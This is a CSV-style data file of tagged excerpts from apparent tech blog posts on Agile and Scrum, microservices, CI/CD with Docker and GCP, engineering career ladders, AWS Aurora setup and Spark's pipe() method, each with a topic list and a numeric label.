2067,"This principle promotes sustainable dev, which Id agree with 100%. Its worth noting, however, that Agile in practice tends to keep the focus on output and team efficiency. Agile was partially killed by the concept of velocity, which, I know, technically isnt even a part of Scrum. Instead of flow of value through the system, Agile unfairly kept the focus on the flow of work through dev teams. Output is not only the wrong thing to focus on, but doing so likely does not promote sustainable development.9. Continuous attention to technical excellence and good design enhances agility.","['Agile', 'Scrum', 'DevOps', 'UX', 'Product']",12
2068,"Do Agile teams tend to determine the architecture? Those emerge by continuous discovery with users, not something the principles stress (or even mention). Further, a team meaningfully self-organizing sort of assumes it already has all the cross-functional, full-stack skills it needs in order to self-organize in the first place. The problem with this assumption is that Agile only focused on delivery. Thus, an Agile self-organized team a good full-stack product team.12. At regular intervals, the team reflects on how to become more effective, then tunes and adjusts its behavior accordingly.","['Agile', 'Scrum', 'DevOps', 'UX', 'Product']",12
2069,Then you have to create a link and copy paste the code in project-root/hook/ __url__ __url__ command.,"['Git', 'Scala', 'Scalafmt', 'Software Development', 'Software Engineering']",7
2070,"Recommending a monolithic architecture these days sounds a bit like prescribing bloodletting for a fever, but hear me out. Long term, to ensure scalability, serviceability, agility, and all the other positive -ities (including sanity) youll likely want to develop and deploy your application on a microservices architecture. But if you are building a new application, your company and your development team may not yet be ready for the ironic complexity involved in breaking a system down into simple services. Speed and time to market may trump eleganceand thats ok! The first reason to build a monolithic system is to help tame the unknowns. Pick up any book or article on getting started with microservices, and it will describe a process for breaking down a system into component services. But if you are just starting out, you dont yet have a system to break down. It can be quite difficult to just figure out what requirements you need in the system at all, much less to try and decompose these requirements into a set of loosely-coupled services with well-defined interfaces. With the level of unknowns at a typical start, the likelihood of getting this analysis even close to right is very small.","['Microservices', 'Software Development', 'Software Architecture', 'Startup', 'Agile']",10
2071,"Finally, a monolithic system may be your fastest path to market, and in many cases this speed is more important than the perfect architecture. For many companies, especially startups working with limited funding, getting to sales is paramount to survival. While microservices will ultimately make life easier, this ease comes with an upfront cost that you may need more maturity to bear. A good microservices architecture is elegantly simple, but it is not easy, fast, or accidental. There are many great, mature, large-scale microservices examples out there todayincluding Twitter, Amazon, Spotify, Linked In but there is a reason they all started out as monolithic applications and later evolved. Never let pursuit of technical perfection get in the way of business success. Pragmatic architecture means that technology choices should be in support of the business needs, not the other way around.","['Microservices', 'Software Development', 'Software Architecture', 'Startup', 'Agile']",10
2072,"We spent some times to get some ideas how shared caching works. Initially since our workers are just Kubernetes pods, all the local caches would be discarded upon the new build. For that reason, we need to store the cache elsewhere in a centralized storage, such as Amazon S3 or Google Cloud Storage. Let see how it looks like And the result Much faster right? But less time for our folks to chill now:(Although we have a good start on improving our CI/CD pipeline, there are still many things left to enhance: There are some concerns on using Docker in Docker (Din D) for publishing docker images. Might be better if we just use physical instances placed inside an auto scaling group, which probably have less overhead and a bit better in performance, but with the cost of management.","['Gitlab', 'Ci', 'Kubernetes', '90seconds']",11
2073,"While CTOs often face outward, the VP of Engineering often faces inward. A VP of Engineering is frequently responsible for building the engineering team and establishing the engineering culture and operations. The CTO might tell the engineering team what needs to get done on the grand scale, e.g., be the leading innovator in human/computer interaction. The VP of Engineering helps foster a culture that manages the how. The best VPs of Engineering at first come across as somebody whos there to help the team work efficiently, and then they almost disappear. Developers on the team collaborate well, mentor each other, communicate effectively, and they think, Hey, were a great team. and maybe they think thats all a lucky accident.","['Startup', 'Technology', 'Software Development', 'Software Engineering', 'Engineering Management']",0
2074,"Generally, engineers can take one of two career paths: move into management, or keep coding. Lots of engineers prefer to stay on the technical path. That progression can take many directions, twists, and turns, but could look something like this: Intern -> Junior Software Developer -> Software Developer/Engineer -> Senior Software Engineer -> Principal Software Engineer -> Software Architect -> Senior Software Architect -> Chief Architect -> CTO -> Engineering Fellow Alternatively, for those engineers interested in a people leadership role, a progression might look something like this: Intern -> Junior Software Developer -> Software Developer/Engineer -> Team Lead/Tech Lead -> Engineering Manager/Project Manager -> Senior Engineering Manager -> Director of Engineering -> VP of Engineering IMO, VP of Engineering, CTO, VP of Product, and VP of Marketing should all report directly to the CEO. Each of them needs to be in charge of their own process. External facing CTOs should not have direct reports (if they do, it usually means they are filling both the CTO and VP of Engineering Roles). Instead, the Engineering leaders report to the VP of Engineering. This is to avoid the two bosses dysfunction, but also because these roles are fundamentally different: one focused on the customer and how the organization fits into the wider world, and the other focused on internal, day-to-day operations. Theyre two wildly different skill sets, with sometimes competing priorities.","['Startup', 'Technology', 'Software Development', 'Software Engineering', 'Engineering Management']",2
2075,"Product teams who feel like engineering is not keeping pace should focus first on quality of engineering hand-off deliverables. Have we done adequate design review? Has an engineer had a chance to provide constructive feedback before handoff? 80% of software bugs are caused by specification or UX design errors, and many of those can be caught before work ever gets handed off to an engineering team. Once you have that process finely tuned, ask yourself if youve really explored the product design space thoroughly enough. Did you build one UX and call it done, or did you try multiple variations? Building and testing variations on user workflows is one of the most valuable contributions a product team can make. Do you have a group of trusted users or customers you can run A/B prototype tests with? One of the biggest dysfunctions of software teams is that the product team is producing sub-par deliverables (sometimes little more than a few rushed, buggy mock-ups), and failing to run any of them by customers or engineers prior to handing them off. That dysfunction causes a pileup of re-work and engineering backlog that often gets blamed on engineering teams.","['Startup', 'Technology', 'Software Development', 'Software Engineering', 'Engineering Management']",0
2076,"Computer Vision Engineer This is one of the best tech jobs in 2019 because the demand for computer vision engineers has grown at a steady rate over the past five years. Their primary responsibilities include creating and fine-tuning both computer vision and ML algorithms so that they can locate, identify and classify objects. Also, since AR/VR has also grown in popularity and is expected to be a $215 billion-dollar business by 2021, the need for computer vision engineer will also increase because it is directly on Ted with AR and VR.2. ML Engineer The ML (Machine Learning) engineers create AI systems and machines that are capable of learning and applying what they learned. They conduct advanced programming while working with convoluted datasets and algorithms to train their AI creations. What makes this one of the best technology jobs is that we see pretty much every IT company out there transforming into an AI company, therefore requiring a huge number of investments and making ML engineers a very in demand and popular profession next year and beyond.3. App Developer App developer made our list of top IT jobs because it sits at the crossroads of where technical capacity meets business needs. This role does not simply imply coding. We mentioned the popularity of AR and VR earlier and the demand for AR/VR software developers will also increase. There have been many AR-based games released in 2018 and as well as many other uses of AR and VR and these technologies will be heavily used in 2019.4. Network Analyst As the Io T becomes mainstream and makes its way into the workplace, there will be a lot more things that will require connectivity in an efficient and easy to use manner, which serves as wind in the sails tech professions such as Network Analyst. They will need to find a way to combine their set of technical skills to produce real-time trending information regarding network traffic and their impact on the company as a whole. Therefore, network analysts will be required to know much more than how sensors work. Future network analysts must possess a thorough grasp of how the entire company operates as well as sound knowledge in AI. These new requirements make this a completely different role than most people are used to.5. Security Analyst As the number of cyber attacks increases every year and each leak of information is costing companies millions of dollars, one of the jobs trends that is very popular right now and will be in the future, is hiring more and more security analysts. The cyber attacks that we are seeing both in the public and private sector are getting more and more advanced, which means that governments and private companies need to be one step ahead all the time. In 2019, companies will be more proactive in terms of taking on security threats head-on, which means that security analysts will need additional AI and data skills.6. Business Intelligence Analyst It is helpful to think of the BI analyst as a counterpart to the mobile app developer. The business analyst tackles all of the issues concerning the business side of products, taking into account the companys need in terms of apps to make a process work. It is the job of the business intelligence analyst to collect all necessary data from a wide variety of sources to draw a comprehensive picture of the companys positioning in the industry and provide recommendations on how to cut costs and achieve growth.7. Dev Ops Lead As you start hiring software developers, testers, and BI analysts, you will need to make sure that you have enough Dev Ops talent on your team in order to coordinate the work between all of these separate groups. The project management skills that they bring to the table are simply indispensable, which go beyond software development. All companies out there want to organize their operations in the most efficient way possible in order to avoid wasting resources and Dev Ops is a driving factor in delivering software faster with greater efficiency.8. Database Administrator As companies provide a greater offering of AI-based software, the demand for database administrators will increase since companies will need to be able to maintain databases in a quality manner to make their products work efficiently.9. Cloud Engineer An increasing amount of companies are moving their vital systems to the cloud and there are opting for a hybrid approach with many vendors. Cloud engineers will need to come up with scalable solutions and combine both in-house technologies with outside systems.10. User Support Specialist The technology is becoming increasingly integrated into our daily lives, we will need the help of support specialists more often, which makes this one of the biggest computer jobs in demand. What many people forget is that software development does not end after the release. You still must monitor the performance of the product and provide support to users who are getting adjusted to your product.","['Virtual Reality', 'Technology', 'It Jobs', 'Tech Jobs']",2
2077,"The signup funnel is where demand is collected. In general, the signup funnel consists of four parts: Landing Welcomes new users and highlights the Netflix value propositions Plan selection Highlights our plans and how they differ Registration Enables account creation Payment Presents payment options and accepts payment In the signup funnel, we have a short time to get to know our users and we want to help them sign up as efficiently and effectively as possible. How do we know if were succeeding at meeting these goals? We use A/B testing in order to learn and improve how users navigate the signup funnel. This enables Growth Engineering to be a lean team that has a tremendous and measurable impact on the business.","['UX', 'Microservices', 'Software Development', 'UI', 'Big Data']",6
2078,"Source of Truth Store is a durable, persistent storage that keeps all the desired state information. It is the single source of truth for the entire system. For example, if a Kafka cluster blows away because of corrupted ZK states, we can always recreate the entire cluster solely based off the source of truth. Same principles apply to the stream processing layer, to correct any processing layers current states that deviates from its desired goal states. This makes continuous self healing, and automated operations possible.","['Big Data', 'Stream Processing', 'Keystone Data Pipeline']",5
2079,"In Flutter you recreate widgets basically all the time. When your build() methods gets called you create a bunch of widgets. This build method is called every time something changes. When an animation happens for example, the build method gets called very often. This means you cant rebuild the whole sub tree every time. Instead you want to update it.","['Android App Development', 'Flutter', 'Technology', 'Code', 'Cross Platform']",18
2080,"Solution: Allow sufficient time to implement the Scrum methodology in your business or team. I recommend anywhere between 3 and 6 months although it does completely depend on the number of people involved. Treat the implementation as your very first Scrum project and break the task down into smaller tasks i.e. train the Product Management team how to groom the Product Backlog. Look to schedule these smaller tasks into short iterations of work (Sprints), making sure you review what has been achieved at the end of each iteration (Sprint Review). Remember, slow and steady wins the race.","['Agile', 'Scrum', 'Software Development', 'Business', 'Productivity']",1
2081,"When implementing Scrum, I use a four-phase plan. First, I focus on convincing the organisation that Scrum will add value and get the teams working on my side, this is the buy-in. During this stage, I also set out the plan phases and give the teams some homework to completesuch as a Scrum test or book to read. To help people take ownership, I task different people and teams with different tasks and arrange a series of further meetings to review progress. In step two, I move onto more advanced things, such as talking about task estimation, sprint velocity and stretch goals. In step three I talk to indirectly affected teams, such as sales and marketing. I tell them how Scrum works and what changes they should expect, such as more regular releases and more opportunities for feedback. Finally, I talk to the customers about the changes and what this means to them, always keeping the positives in mind.","['Agile', 'Scrum', 'Software Development', 'Business', 'Productivity']",1
2082,"Solution: The first step in any Scrum implementation (after setting a vision) should be to get a feel for the general level of experience and knowledge with the methodology. Hold a meeting where your colleagues can speak up about their shortfalls and start creating a gap-analysis. When I carry out this exercise, I like to get everyone to write their concerns/knowledge gaps on post-its and stick them onto the wall. Once youre done, categorise these into topics, such as Sprints Rules or Definition of Done, and write them as headings or lanes on a whiteboard. Now ask everyone to write their names on post-its and stick them into the lane or column which they would like to know more about. The beauty of this technique is your team may have unknown unknownsmeaning they didnt realise there was something they didnt know. Having an open workshop like this encourage knowledge sharing and you will usually get some good results. If you prefer, you can always write the headings on the board before the meeting if you are confident enough that youve covered everything.","['Agile', 'Scrum', 'Software Development', 'Business', 'Productivity']",0
2083,"When we run the image, we specify a couple of parameters. One is -d which specifies that the image should be run in the background. The second is -p 80:80 which specifies that port 80 in the container should be mapped to port 80 on the machine the container is running on. If port 80 is taken by something else on your machine, you can map it to something else. If you want to map it to port 8080, then you would change the parameter to -p 8080:80. And then you would access the app by going to http://localhost:8080/. No matter what port on the machine you map it to, the app itself always acts like its using port 80.","['Docker', 'Csharp', 'Dotnet Core', 'Tutorial']",7
2084,"For the sake of simplicity, the Angular app will be served by Nginx. So, create your new Angular app (follow the steps described here) and cd <app-name>. In order to pack the app plus the Nginx server as a Docker image, lets create a file named Dockerfile in its root folder, with the following content: Basically, its a multi-staged Docker build. The lines from 1 to 5 (stage 1) use a Node JS 8 image just to build the app. The lines from 7 to 11(stage 2) copy the result of the build processa set of HTML, CSS and JS filesto a Nginx image and replace the default servers home page with apps content. Finally, line 12 starts the server.","['Google Cloud Platform', 'Continuous Delivery', 'DevOps', 'Cloud Build', 'Compute Engine']",7
2085,"In typical non-automated or semi-automated deployment scenario, an Engineer could (1) set up a CI tool such as Jenkins to monitor a Git repository for new pushes, (2) trigger the build process when new content is pushed and (3) find a mystic way to update all VMs that are running the Docker containers to update the new version. Steps 1 and 2 are simple. At this point GCPs offers a much more sophisticated approach: instead of creating VMs, installing Docker on them and manually managing the containers, what about creating VMs that exclusively run a specific Docker container and automatically update themselves when new versions of the images are published? So, lets see how to do it.","['Google Cloud Platform', 'Continuous Delivery', 'DevOps', 'Cloud Build', 'Compute Engine']",18
2086,"So, what if we push a new version of the application to the Git repository? Which steps do we need to repeat in order to have it running in production? There are many ways to do it in GCP, including publishing a message to some Pub Sub topic to invoke a Cloud Function that restarts the VMs, or use advanced options for update managed instance groups ( __url__ restart).","['Google Cloud Platform', 'Continuous Delivery', 'DevOps', 'Cloud Build', 'Compute Engine']",18
2087,"To recap, a CMS is commonly used to manage your content and build a site that displays that content to your user. All in one big piece of software! Over the past few years, the idea of a Headless CMS has become popular, its the idea of using the CMS only for managing content and using a different tool to deliver the user-facing website (the front-end). The front-end website fetches the content via an application programming interface (or API). APIs have become very popular and are the industry standard way to transfer content and data between two systems. All major CMSs offer APIs now which makes Headless CMS possible. There are also specialised Headless CMSs out there like Contentful and Cockpit.","['Web Development', 'Headless Cms', 'Jamstack', 'CMS', 'Web Standards']",19
2088,"By Dave Chang At Nerd Wallet we have a bi-annual review cycle to evaluate how we are doing both as Nerd Wallet engineers and as professionals. As a part of reviews, we use a standard job architecture when performing evaluations across the organization, with the intent that everyone is judged on a level playing field. After our most recent review cycle, though, we felt that our engineering job architecture was starting to show its age. We last updated it more than two years ago, and it simply wasnt meeting our needs any more. Originally created for a team of 25 engineers, some of the nuance in the job architecture that was easy to convey with the smaller team was being lost with our larger ~100 person organization. Managers werent always evaluating their teams in the same way and some of the engineers were approaching the architecture as a checklist of tasks to execute and less as an embodiment of expectations and values for the engineering team. It was perfectly rational for people to do this. As engineers, a major part of our jobs is to take complex, sometimes nebulous requirements and impose logic and structure on them. So, naturally, people might look at the architecture as a discrete set of steps to take to get to the next level. To address these problems, a cross-section of the engineering team set about rewriting the job architecture to better suit Nerd Wallets needs.","['Startup', 'Nerdwallet', 'Careers', 'Software Development']",0
2089,"Was it really so bad to have the job architecture function in a similar fashion? It makes sense to have clear guidelines like this, particularly when youre dealing with large populations of people. There are approximately 600,000 active pilots in the US. Evaluating them all on personalized, qualitative criteria is unfeasible. Broad-based quantitative standards are necessary for our aviation system to operate with any semblance of efficiency, even if it obscures nuances around individual achievement. It is natural for people to think of their career progression in a similar fashion and for companies to create job architectures using this same model. Designs that work well for larger groups of people, though, have significant issues when applied to much smaller populations: A companys needs, particularly startups, can evolve from year to year, or even quarter to quarter. Even if you can enumerate exactly what you need today, that may change as the company changes.","['Startup', 'Nerdwallet', 'Careers', 'Software Development']",12
2090,"Of course, this method of evaluation comes with its own challenges. How do you map subjective criteria into discrete job titles? How do you ensure that managers are using identical subjective criteria for evaluating engineers? Most importantly, as with all refactors, how do you know youre not just introducing a system that is as broken as your previous one, but in different ways? At Nerd Wallet, we have six levels for individual contributor engineering. Leveling is a blunt instrument, but for any non-trivially sized engineering organization, a necessary evil. Leveling helps you ensure that your team is being properly compensated and helps your engineers demonstrate professional growth when they eventually decide to move on. How do you distinguish work at one level versus another, though, particularly in the context of subjective criteria? We decided to tackle this from two perspectives: What is the high level description of a given engineering role, independent of specific values? If done correctly, we should be able to identify a distinct difference between each level to justify maintaining our current set.","['Startup', 'Nerdwallet', 'Careers', 'Software Development']",0
2091,"At the Staff Engineer level and above, there was originally an expectation that an engineer have impact on the broader engineering team as a whole. This requirement tended to favor platform engineers who have more of an opportunity do wide-ranging work as a function of their role. Product engineers on the other hand are typically focused on their specific domain. The obvious outcome of this disparity was that talented Senior Engineers on the product side would either have to work harder than platform engineers to earn a promotion, or move out of product engineering to focus on platforms. Neither of these outcomes were acceptable to us. Just from a standpoint of fairness, we didnt want equally talented engineers judged by different standards, and as a user-first company, it was important for us to have a strong product engineering discipline.","['Startup', 'Nerdwallet', 'Careers', 'Software Development']",12
2092,"At first we considered the possibility of maintaining separate architectures, but we all agreed this would be infeasible. We wanted a single architecture that could flex and grow with the company, not multiple that we would have to manage and coordinate between. We instead decided was that while the intent of the requirement was correct, the way it manifested in the architecture was poorly worded. In particular, we do want Staff Engineers to have reach beyond their immediate team, but there is no reason to constrain that influence to the engineering organization. So, with Staff-level product engineers, they will most likely reach outside of their team when engaging with product managers, designers, and user researchers. More generally, Staff Engineers, are expected to drive improvements in outcomes with their partners and stakeholders, regardless of who they may be.","['Startup', 'Nerdwallet', 'Careers', 'Software Development']",12
2093,"As chance would have it, we finished the first draft of the architecture right before mid-year reviews. It would have been premature to roll it out right away, but it presented an opportunity for us to beta test it with engineering managers. We asked them to use the then-current architecture for official reviews, but to compare it side-by-side with the new architecture so they could provide contextually relevant feedback on what they felt worked and what didnt. Almost all feedback was accepted with little issue. In the old architecture, changing a single bullet point had a much higher likelihood of changing the responsibilities and expectations for a given role, but the greater verbosity of the new architecture meant that we could much more readily incorporate feedback without altering the underlying intent. After a couple of rounds of feedback from the managers, we decided that the architecture was ready to share with the wider organization.","['Startup', 'Nerdwallet', 'Careers', 'Software Development']",6
2094,"Currently Brick is at version v0.5.3. Creating a new release increments the patch number resulting in version v0.5.4. The version number is incremented only for repositories that have new changes. For example, the figure below shows the next release, v0.5.4. For repositories colored in grey no action is needed during the release. New versions will be created only in the Brick and Bloc repositories, as only they have new changes.","['Pharo', 'Trunk Based Development', 'Git', 'Continuous Delivery', 'Continous Deployment']",18
2095,"Did you notice I flagged the word accidentally, in the previous paragraph with quotations? Merging code into master should never be considered an accident. In fact I feel having code in master as quickly as possible is the best practice we could have.","['Git', 'Software Development', 'Software', 'Project Management', 'Programming']",9
2096,"Whats most important is when we branch for feature development, we are hiding our work from our teammates. Well potentially it could mean catastrophe. If 2 developers are working on similar stories, its possible time could be wasted where both developers are building the same functionality to achieve a particular task at the same time. Its only once one of the developers merges their entire feature into master that the other one finds out about it, and then has to refactor his code, meaning more time wasted. Sure we could communicate who does what, but be realistic here. Not every developer will understand what another developer needs to do in order to complete their story all of the time.","['Git', 'Software Development', 'Software', 'Project Management', 'Programming']",1
2097,"A typical scrum process breaks up the responsibilities into 3 different roles: Product Owner, Scrum Master, and the development team. Product Owners is the person who represents the clients best interest. This is typically the person who interacts with the client and has a firm understanding of the business requirements. Product owners are also the initiators in the scrum process who define the list of tasks called Backlog, and prioritize them in order of importance. Scrum Master, on the other hand, is the process leader who is responsible for make sure the team is following the scrum best practices.","['Agile', 'Scrum', 'Development', 'Process', 'Waterfall']",0
2098,"sounds like a lot of work! I thought we are trying to become lean and flexible right? This seems to be adding more steps? These are the typical reaction I get after explaining the process. Some people may feel this is too much administrative work that they may not have enough bodies for. So does it really work for small teams? The answer is yes, and let me show you how our team was able to make a big leap in process efficiency and product quality using scrum.","['Agile', 'Scrum', 'Development', 'Process', 'Waterfall']",1
2099,"Unfortunately, quick turn-around also exposed us for potential bugs as we were not given proper time to test. For example, if you look at 11/21/2016 revision where a bug was introduced. Before we could properly test for it, another revision came 4 days later. The new set of changes shifts everyones focus, and that particular bug got lost in the mix. Fortunately, we found it near the end and delayed the launch. Otherwise, we would have a much bigger issues with a major escape in the field.","['Agile', 'Scrum', 'Development', 'Process', 'Waterfall']",13
2100,"How would scrum help this scenario? Using our new scrum process, we would break up the project into sprints like the red lines shown in the diagram above, and here are the improvements: Systematic changes: Changes are only re-assessed at beginning of each sprint cycle, which allows us the batch some of the changes together. From my experience, a lot of revisions are changes on top of previous changes, which made previous revision obsolete. This was a big efficiency gain because it allows us to tackle more things with less iterations. Note: this is also a huge behavior change because it also means you are not accommodating your clients immediate request, which can be counter intuitive to grasp. it is going to be a tough sale trying to explain to the client.","['Agile', 'Scrum', 'Development', 'Process', 'Waterfall']",1
2101,"All of these contributed to a better product at the end. Comparing from projects before and after we implemented the change, we had nearly 80 % reduction in defects and 70% reduction in development iterations. In fact, the larger and more complex the project is, the better we performed. Yet there were still room for us to get even better. So for those who are still hesitant about making the change to scrum, I would advise to go for it. If your team is small, dont be constraint by the formalities. Tailor the framework for your need. Remember scrum is like a big tool set. It is you that ultimately decide which tools to use.","['Agile', 'Scrum', 'Development', 'Process', 'Waterfall']",1
2102,"Under settings, come up with a unique name to use for the database cluster. Also fill in the username and password for the master user, which will serve as the admin for the server. (For security purposes, pick a less common username and a long password. I also recommend creating a different, lower-privileged user that you use for day-to-day querying, minimizing the use of the admin account. )Under capacity settings, choose the minimum and maximum stats youd like for your server. If youre not sure, 8 ACUs is probably a good maximum for a small application. You can always change this later, though it might require a brief downtime to apply the change.","['AWS', 'Aurora', 'Serverless', 'Sql', 'Rds']",7
2103,"Why dont Agile transformations tend to succeed? It may boil down to a clash between subcultures. Jess Mc Mullin has suggested that Service Design is a sort of Trojan Horse for transformation, that to improve the service offered you must redesign the org itself. The story of the Trojan Horse is a story about war; and, in certain respects, it offers an apt metaphor. In many organizations, a battle of sorts is being fought, even if largely unstated. In this version of the story though, the Greeks dont offer the gift and pretend to sail away. Here, the Greeks work for Trojan leadership.","['Management', 'Agile', 'Scrum', 'Transformation', 'Strategy']",12
2104,"In this conflict, the Greeks are probably more in the right, and thats where the ethical dilemma comes in: Should those who better understand Agile push it as a way of saving organizations, over and above letting leaders know its really not what theyre paying for? And how could the Trojans be so wrong? (In a way Scrum was a Trojan Horse that killed Agile. )Sutherland sold Scrum to managers as something that gets twice the work done in half the time. The Trojans, after all, think Agile is something that will help them meet their Waterfall numbers faster. This is how theyre paid to thinktheir pay is tied to output. More value might be generated by maximizing outcomes per least amount of work, but that doesnt always get you a bigger bonus. (As the Yiddish proverb states, you cant put a thank you in your pocket. )The Scrum bill of goods resonates with orgs that confuse productivity with the busyness of individual contributors, indeed with orgs that still focus on individual contributors at all. The Greeks, of course, also want Agile, which they see as separate from the Waterscrumfall so beloved by the Trojans. They think they see inside the horse, and inside it is not only the death of Waterfall but of many of the structures that feed into it. So, you basically have two groups using the same terms while speaking completely different languages, often with radically different agendas, and we wonder why Agile transformations fail.","['Management', 'Agile', 'Scrum', 'Transformation', 'Strategy']",1
2105,"In the analogy above, both sides of the struggle are wrong. The Trojans are wrong in thinking the answer is to (only) increase Greek output. (Yes, output matters, but focusing only on output is tantamount to solipsism.) The Greeks are wrong when they argue the entire org should be Agile. (It turns out thats not even possible. )As Mezick and Sheffield put it, traditional leadership can no longer keep pace with the world. Indeed, it may be as much as 1000x too slow. Traditional leadership relies on formal authoritythe structure captured in the org chart. As this implies, in todays world the org chart never depicts how the work actually gets done.","['Management', 'Agile', 'Scrum', 'Transformation', 'Strategy']",12
2106,"Informal authority handles complex problems with adaptive self-organization. As Mezick and Sheffield define it, self-organization is the dynamic (read Agile) sending and receiving of authority. When we find people we want to associate with, self-organization naturally follows, run by the currency of street cred. When we ask people in our group to make certain decisions, we grant informal authority on the fly. When we no longer respect someones decisions, said authority is revoked just as quickly. It is emergent, opt-in, always-on, and ever-informed by the collective knowledge of the group in an Agile way that formal authority can never match.","['Management', 'Agile', 'Scrum', 'Transformation', 'Strategy']",12
2107,"This doesnt mean, however, that the Greeks are right who want formal authority replaced with something Agile. (Would the result be anarchy or holacracy? Yes, only a self-organizing team can be Agile, but all leadership cannot be self-organizing.) After all, the informal system has its problems too. Power lies in knowing how authority is distributed. In the informal system, this is both in constant flux and only tacitly known. There are no publicly-visible rules of the game, and thats an issue. If thats all there was, everything would be politics. The formal hierarchy is direly needed, but Agile does prescribe what its focus should be. To see why, lets return to the Trojan War.","['Management', 'Agile', 'Scrum', 'Transformation', 'Strategy']",12
2108,"Formal authority tends to want the entire system syphoning information up to decision makers. Instead it should be delegating decision authority down to where the information naturally resides. Remember Andy Groves admonition: Decisions should be made by the lowest level responsibly possible. This is achieved by having the formal hierarchy focus on structuring the known rules of the game. They should focus on shaping the constraints the informal authority network then works within, granting authority to the informal network to make the decisions when needed (at the last responsible moment), so long as they are within the given constraints. (This also goes far in minimizing delay costs. )Some at the top, of course, still wont like this. (It means they need to stop authority hoarding.) Thats unfortunate, because we cannot keep pretending its the 1980s. As executive coach Sharone Bar-David puts it, Power isnt what it used to be. The old view was that power came with certain privileges. To see why, we must also distinguish between what Mezick and Sheffield call legitimate and illegitimate authority. In todays world, even formal authority is servant in nature. Your day-to-day actions as a leader, your congruence or lack thereof, your presence, how you show up, continuously determine the very legitimacy of your authority, which must be continuously earned. Just because youre in a position of formal authority does not mean anyone will take you seriously. )Leadership is about making decisions that affect the group. Authority is only legitimate to the extent those affected by such decisions support the person making them. When the formal hierarchy ignores this key information flowing from the informal network, trouble will follow. At best, morale will be shot. At worst, there will be mutiny. The informal network will start to undermine the formal structure. Remember, this is of necessitythe informal networks are what get the real work done. When the formal authority hierarchy ignores this dynamic, it pours gasoline on the very subculture power struggle that tanks so many transformations.","['Management', 'Agile', 'Scrum', 'Transformation', 'Strategy']",12
2109,"To close, no organization can increase its ability to sense and respond in a complex environment by keeping decision authority confined to its formal hierarchy. Agile transformation, properly understood, is about keeping formal authority in place while empowering it to manage differently. As Rob England puts it, Agile transformation, at its very core, is about new ways of managing. Its about new ways of leading. (Again, its not about dev team efficiency.) And how could it be otherwise? What is the point of management, after all, if not to help the org handle complexity? Sohow do we stop fighting the Trojan War? First, we stop trying to make the formal authority structure Agile. There is nothing about it that could ever be Agile in the first place. Second, the formal hierarchy, if it ever wants to move past lip service to Agile coupled with same-old, top-down Waterfall, must focus on enabling the informal authority network to make fast decisions, close to where the information lives, as it learns its way forward in a sense-and-respond (again, read Agile) fashion.","['Management', 'Agile', 'Scrum', 'Transformation', 'Strategy']",12
2110,"What did make me recall Mr. Sherlock Holmes and his famous a one-pipe problem? Recently I faced a need to fork external process within from Spark-application. There was practical necessity to add to existing functionality digital signal processing Butterworth filter, FFT, etc. Having done investigation Ive discovered neither Scala nor Java has such library. But there is Scipy library for Python. So, I had two possible solutions: write digital signal processing myself or integrate somehow existing code with Python. I preferred solution #1, but the customer as true data scientist insisted on solution #2. So, the task was to integrate Scala-based Spark application with Python scripts to handle its RDD.","['Spark', 'Pipe', 'Big Data', 'Scala', 'Hadoop']",3
2111,"Lets start from a simple example. Say, I have a bash script which is run on a linux host. The script concatenates line from stdin, adds hostname and writes the line to stdout. Its code is below: I can send three lines to it to see the output: Lets imagine we have RDD and we want to handle its data with this bash script. This is where method pipe() comes into the play. So, we can invoke an external process using the following code.","['Spark', 'Pipe', 'Big Data', 'Scala', 'Hadoop']",3
2112,"In this way, after invocation RDD will contain the same number of partitions as it had before. It can be considered as a replacement of input partitions by lines from external processs stdout. This workflow is depicted below Im going to give one more example. Suppose we have an archive file, containing climate data for Yagotyn district. The file itself can be found on my Github repository. Well take several first lines to study file format and discover that it is semi-structured The task is to extract for research purposes such information: date and time(Local time in Yagotyn), temperature(T), atmospheric pressure (Po) and humidity (U) for observations where visibility(VV) was less than one kilometer. I think its most likely a fog. To extract these data we have to apply the sequence of transformations against these lines: Get rid of quotes because of the need to filter by visibility. It should be cast to numeric type from string.","['Spark', 'Pipe', 'Big Data', 'Scala', 'Hadoop']",3
2113,"Someone can blame this code because of its readability. Perhaps I would do it myself when finding something like that in a repository and Id prefer to see explicit, self-expressing code. But Spark is often used in interactive mode especially by data scientists. They dont save sources into Git, they dont build it as they dont have such needs. Algorithms are often written once and run once. This is the case when a user can be egoistic and care about his convenience only and such solution is justified.","['Spark', 'Pipe', 'Big Data', 'Scala', 'Hadoop']",9
2114,"You can be one of those guys who always want to understand how it works on a low level. This why I added this sequence diagram, describing the processes behind the scene. For sake of sanity, I skipped some non-essential details to not overload the diagram. The actual implementation consists of much more blocks. You can check it yourself exploring Spark source code. I did not want to bore the readers with all this stuff and outlined most important parts which define expected functionality Why does the diagram start with Piped RDDs method compute() instead of pipe(). This is because pipe() method is just transformation which does not fire any action but just returns Piped RDD instance. And after that invocation is delegated to its compute() method.","['Spark', 'Pipe', 'Big Data', 'Scala', 'Hadoop']",3
2115,"I completely missed the __url__ boom (and bust). While my university friends were taking jobs as Webmasters, I was working night shifts at the Austin American-Statesman in the Art Department. My friends tools were Corel DRAW, Fetch, and Netscape. My tools were Quark Xpress, X-acto knives and Clip art. Every night, graphic artists like myself, writers, platemakers, pressmen, and editors would gather around the paste-up table and assemble sections of the daily newspaper. Carol, the floor manager, facilitated the comings and goings, reviews, and sign-offs from all the proper parties like an air traffic controller. Highly caffeinated and detail oriented, watching Carol orchestrate the collection, assembly and production of over nine editorial sections, with hundreds of stories and advertisements, was a thing of beauty. The whir and sputter of the platemaker signalled to all it was time to gather around the paste-up table and print the news. Everyone had a task: typesetting, advertisements, final art, exposing negatives, ink mixing, paper cutting. The final pagethe ultimate paste-up ready to be photographedgave everyone focus and purpose.","['Design', 'Collaboration', 'Management And Leadership', 'Design Thinking']",17
2116,"The physical distance between an idea and a surface should be as short as possible. Moveable walls, whiteboards, and erasable markers should be prominent and abundant. Paper, stickers, and post-it notes should be in plentiful supply. Blue-tac or pins can be used for putting up print outs. Dedicate an area of the room to displaying principles and other motivational pieces. These serve as a reminder to why youre building the boat. Framed posters with your organisations values serve as the Carol. For the eco-conscious, utilise several large TV displays and display work with tools like Wake. Hang the displays in high-traffic areas to show work-in-progress, investigations or user research.","['Design', 'Collaboration', 'Management And Leadership', 'Design Thinking']",14
